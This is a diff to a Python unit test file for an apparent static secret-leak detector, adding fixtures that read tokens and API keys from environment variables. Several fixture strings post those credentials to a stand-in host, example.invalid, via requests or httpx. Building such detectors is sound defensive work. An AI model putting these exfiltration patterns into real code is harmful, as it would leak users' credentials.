@@ -11,7 +11,7 @@ class CrossFilePrototypeTests(unittest.TestCase):
 
     def test_unsent_getter_and_local_shadow_are_not_reported(self):
         source='import os\ndef key():\n return os.getenv("TOKEN")\n'
-        for caller in ['from settings import key\nprint(key())','import requests\nfrom settings import key\nkey="public"\nrequests.post("https://example.invalid",json=key)','import requests\nfrom settings import key\ndef key(): return "public"\nrequests.post("https://example.invalid",json=key())','import requests\nfrom settings import key\nrequests.post("https://example.invalid",json={"exists":bool(key())})','import requests\nfrom settings import key\nrequests.post("https://example.invalid",headers={"Authorization":key()})']:
+        for caller in ['from settings import key\nprint(key())','import requests\nfrom settings import key\nkey="public"\nrequests.post("https://example.invalid",json=key)','import requests\nfrom settings import key\ndef key(): return "public"\nrequests.post("https://example.invalid",json=key())','import requests\nfrom settings import key\nrequests.post=lambda **kwargs: None\nrequests.post(json=key())','import requests\nfrom settings import key\nrequests.post("https://example.invalid",json={"exists":bool(key())})','import requests\nfrom settings import key\nrequests.post("https://example.invalid",headers={"Authorization":key()})']:
             self.assertFalse(review.analyze({'settings.py':source,'main.py':caller})['findings'])
 
     def test_ambiguous_and_invalid_modules_are_not_treated_as_complete(self):
@@ -23,3 +23,18 @@ class CrossFilePrototypeTests(unittest.TestCase):
     def test_invalid_paths_and_limits(self):
         self.assertEqual(review.module_name('../secret.py'),'')
         with self.assertRaises(ValueError):review.analyze({str(i):'x' for i in range(501)})
+
+    def test_aliases_and_credential_names_have_grounded_line_numbers(self):
+        for provider in ['import os as operating\ndef read():\n return operating.getenv("OPENAI_API_KEY")', 'from os import getenv as env\ndef read():\n return env("ACCESS_TOKEN")']:
+            for lib in ['requests','httpx']:
+                caller=f'import {lib} as client\nfrom config import read as value\nclient.post("https://example.invalid",data={{"credential":value()}})'
+                with self.subTest(provider=provider,library=lib):
+                    result=review.analyze({'config.py':provider,'app.py':caller})
+                    self.assertEqual(len(result['findings']),1)
+                    self.assertEqual(result['findings'][0]['line'],3)
+
+    def test_getters_with_parameters_async_or_nonsecret_names_are_not_inferred(self):
+        caller='import requests\nfrom config import read\nrequests.post("https://example.invalid",json=read())'
+        for provider in ['import os\ndef read(required):\n return os.getenv("API_KEY")','import os\nasync def read():\n return os.getenv("API_KEY")','import os\nos.environ["API_KEY"]="public"\ndef read():\n return os.getenv("API_KEY")','import os\ndef read():\n return os.getenv("TOKENIZER_MODE")','import os\ndef read():\n return os.getenv("MONKEY_COUNT")']:
+            with self.subTest(provider=provider):
+                self.assertFalse(review.analyze({'config.py':provider,'app.py':caller})['findings'])
